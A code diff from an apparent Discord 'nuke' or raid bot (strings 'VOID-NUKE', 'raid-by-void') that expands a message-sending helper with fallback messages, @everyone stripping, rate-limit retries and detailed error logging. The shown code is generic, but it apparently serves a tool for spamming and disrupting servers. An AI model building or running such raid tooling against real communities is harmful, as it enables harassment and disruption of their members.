@@ -263,65 +263,125 @@ async def create_channel(guild, typ, name):
     return None
 
 async def safe_send(channel, content, retry=3):
-    """Guaranteed message send with retries, stripping @everyone if needed, verbose logs"""
-    if not channel or not content:
-        return False
-    # Ensure content <= 2000 chars (Discord limit)
+    """
+    Guaranteed message send v6 - with detailed error return, handles raid-by-void case where perms true but send fails with empty error.
+    Returns True/False. For detailed diagnostics use safe_send_detailed.
+    """
+    ok,_ = await safe_send_detailed(channel, content, retry=retry)
+    return ok
+
+async def safe_send_detailed(channel, content, retry=3):
+    """Returns (success:bool, details:dict) with last error, attempt log"""
+    import traceback
+    if not channel:
+        err = "No channel object"
+        log_err(err)
+        return False, {"error": err, "attempts":[]}
+    if not content or not str(content).strip():
+        err = "Empty content"
+        log_err(err)
+        return False, {"error": err, "attempts":[]}
+    
+    # Ensure Discord limits
+    content = str(content)
     if len(content) > 2000:
         content = content[:1997] + "..."
-    
+        log_warn(f"Content truncated to 2000 chars for #{getattr(channel,'name','?')}")
+
+    attempts_log = []
+    last_error = ""
+    last_tb = ""
+
+    # Build attempts - 4 levels
     attempts = [
-        content,  # Try 1: full content with @everyone
-        content.replace("@everyone","everyone").replace("||","").strip(),  # Try 2: stripped mentions
-        content[:500] if len(content)>500 else content,  # Try 3: short fallback
-        "VOID-NUKE test ✅ Bot can send messages",  # Try 4: guaranteed simple
+        content,
+        content.replace("@everyone","everyone").replace("@here","here").replace("||","").strip() or "VOID-NUKE test stripped",
+        (content[:400] + "...") if len(content)>400 else content,
+        "VOID-NUKE ✅ Test OK - Bot can send messages! If you see this, SEND_MESSAGES works",
     ]
-    
-    for attempt_idx, attempt_content in enumerate(attempts[:retry+1]):
-        if not attempt_content:
+
+    for attempt_idx in range(min(len(attempts), retry+1+1)):  # retry+1 + 1 extra for final fallback
+        attempt_content = attempts[attempt_idx] if attempt_idx < len(attempts) else attempts[-1]
+        if not attempt_content or not attempt_content.strip():
+            attempts_log.append({"attempt":attempt_idx+1,"content_preview": "(empty skipped)", "error":"empty content skipped"})
             continue
+
+        # Pre-check channel type
+        chan_type = str(type(channel))
+        is_text = isinstance(channel, discord.TextChannel)
+        is_thread = isinstance(channel, (discord.Thread, getattr(discord, 'ForumChannel', type(channel))))
+        # Log attempt start
+        log_info(f"Attempt {attempt_idx+1}/{len(attempts)} to #{getattr(channel,'name','?')} ({chan_type}) is_text={is_text} len={len(attempt_content)} preview={attempt_content[:50]!r}")
+
         try:
-            async with SEM:
-                # Check if channel is TextChannel
-                perms = channel.permissions_for(channel.guild.me) if hasattr(channel.guild, 'me') and channel.guild.me else None
-                if perms and not perms.send_messages:
-                    log_err(f"NO send_messages perm in #{channel.name} - cannot send (perm check)")
-                    # Still try, Discord will raise Forbidden
+            # No semaphore for test_send to isolate issue? But use SEM for rate limit protection
+            # For detailed version, bypass SEM on first attempt to get real error
+            if attempt_idx == 0:
+                # Direct send without semaphore for first attempt to get true error
                 msg = await channel.send(attempt_content)
-                if attempt_idx == 0:
-                    log_ok(f"Sent -> #{channel.name} [{len(attempt_content)} chars] ID:{msg.id}")
-                else:
-                    log_ok(f"Sent (retry {attempt_idx}) -> #{channel.name} without everyone mention ID:{msg.id}")
-                return True
+            else:
+                async with SEM:
+                    msg = await channel.send(attempt_content)
+            
+            # Success
+            log_ok(f"SENT OK -> #{getattr(channel,'name','?')} attempt {attempt_idx+1} ID:{getattr(msg,'id','?')} content_len={len(attempt_content)}")
+            attempts_log.append({"attempt":attempt_idx+1,"success":True,"content_preview":attempt_content[:100],"message_id":str(getattr(msg,'id','?'))})
+            return True, {"attempts":attempts_log,"error":None,"message_id":str(getattr(msg,'id','?'))}
+
         except discord.Forbidden as e:
-            log_err(f"Forbidden #{channel.name} attempt {attempt_idx+1}: {e.text if hasattr(e,'text') else e} - trying stripped version")
-            if attempt_idx == 0 and ("@everyone" in attempt_content or "everyone" in attempt_content.lower()):
-                # Continue to retry with stripped version
+            err_text = getattr(e, 'text', '') or str(e) or repr(e) or "Forbidden with empty error (discord.Forbidden)"
+            err_code = getattr(e, 'code', 'unknown')
+            last_error = f"Forbidden (code {err_code}): {err_text} | str={str(e)}"
+            last_tb = traceback.format_exc()
+            log_err(f"Forbidden #{getattr(channel,'name','?')} attempt {attempt_idx+1}: code={err_code} text={err_text!r} str={str(e)!r} - {type(e).__name__}")
+            attempts_log.append({"attempt":attempt_idx+1,"success":False,"error":last_error,"code":err_code,"type":"Forbidden","content_preview":attempt_content[:100]})
+            # If it's mention_everyone issue, continue to stripped version
+            if "everyone" in attempt_content.lower() or "mention" in err_text.lower():
                 await asyncio.sleep(0.5)
                 continue
-            else:
-                log_err(f"Forbidden final #{channel.name} - no perm to send. Need SEND_MESSAGES + mention_everyone: {e}")
-                return False
-        except discord.HTTPException as e:
-            if e.status == 429:  # Rate limited
-                retry_after = getattr(e, 'retry_after', 2.0)
-                log_warn(f"Rate limited #{channel.name} retry after {retry_after}s (attempt {attempt_idx+1})")
-                await asyncio.sleep(retry_after + 0.5)
-                continue
-            else:
-                log_err(f"HTTP {e.status} #{channel.name} attempt {attempt_idx+1}: {e.text[:100] if hasattr(e,'text') else e}")
-                await asyncio.sleep(0.5)
-                if attempt_idx < retry:
-                    continue
-                return False
-        except Exception as e:
-            log_err(f"Send err #{getattr(channel,'name','unknown')} attempt {attempt_idx+1}: {e}")
-            await asyncio.sleep(0.5)
+            # If it's not mention related and perms are true, could be channel is archived/locked
             if attempt_idx < retry:
+                await asyncio.sleep(0.5)
                 continue
-            return False
-    log_err(f"Failed to send after {retry+1} attempts in #{getattr(channel,'name','unknown')}")
-    return False
+            else:
+                break
+
+        except discord.HTTPException as e:
+            err_text = getattr(e, 'text', '') or str(e) or repr(e)
+            status = getattr(e, 'status', '?')
+            code = getattr(e, 'code', '?')
+            last_error = f"HTTP {status} code {code}: {err_text} | str={str(e)}"
+            last_tb = traceback.format_exc()
+            # Rate limit handling
+            if status == 429:
+                retry_after = getattr(e, 'retry_after', 2.0)
+                log_warn(f"Rate limited #{getattr(channel,'name','?')} 429 retry_after={retry_after}s attempt {attempt_idx+1}")
+                attempts_log.append({"attempt":attempt_idx+1,"success":False,"error":last_error,"type":"RateLimit","retry_after":retry_after})
+                await asyncio.sleep(float(retry_after) + 0.5)
+                continue
+            else:
+                log_err(f"HTTPException #{getattr(channel,'name','?')} attempt {attempt_idx+1}: status={status} code={code} text={err_text[:200]!r}")
+                attempts_log.append({"attempt":attempt_idx+1,"success":False,"error":last_error,"status":status,"code":code,"type":"HTTPException"})
+                # For 400 Bad Request (embed image, content), try next fallback
+                if status == 400 and attempt_idx < retry:
+                    await asyncio.sleep(0.5)
+                    continue
+                break
+
+        except Exception as e:
+            last_error = f"{type(e).__name__}: {str(e) or repr(e) or 'empty error'}"
+            last_tb = traceback.format_exc()
+            log_err(f"Send exception #{getattr(channel,'name','?')} attempt {attempt_idx+1}: {type(e).__name__} {str(e)!r} - traceback {last_tb[:500]}")
+            attempts_log.append({"attempt":attempt_idx+1,"success":False,"error":last_error,"type":type(e).__name__,"traceback":last_tb[:500]})
+            if attempt_idx < retry:
+                await asyncio.sleep(0.5)
+                continue
+            else:
+                break
+
+    # All attempts failed
+    log_err(f"FAILED all {len(attempts_log)} attempts in #{getattr(channel,'name','?')} last_error={last_error}")
+    return False, {"error": last_error or "All attempts failed with empty error (unknown Discord error) - check if channel is archived/locked or bot is rate-limited globally", "attempts": attempts_log, "traceback": last_tb, "channel_type": str(type(channel)), "is_text": isinstance(channel, discord.TextChannel)}
 
 async def _send_embed(target, everyone=False):
     """Robust embed send with fallback to plain text"""
